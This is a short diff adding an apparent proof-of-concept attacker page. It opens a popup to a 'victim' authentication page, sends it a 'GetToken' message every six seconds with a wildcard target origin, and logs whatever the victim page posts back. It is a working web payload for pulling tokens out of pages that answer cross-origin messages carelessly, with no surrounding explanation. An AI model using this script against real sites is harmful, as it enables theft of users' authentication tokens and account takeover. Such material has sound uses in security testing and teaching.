@@ -1,0 +1,17 @@
+<script>
+
+var popup = window.open("http://domain.com/auth/victim.html");
+
+
+setInterval(function(){
+    popup.postMessage("GetToken","*"); //send the message and target URI
+},6000);
+
+window.addEventListener("message", (event) => {
+  console.log("Source:");
+  console.log(event.source);
+  console.log("Data:");
+  console.log(event.data);
+}, false);
+
+</script>
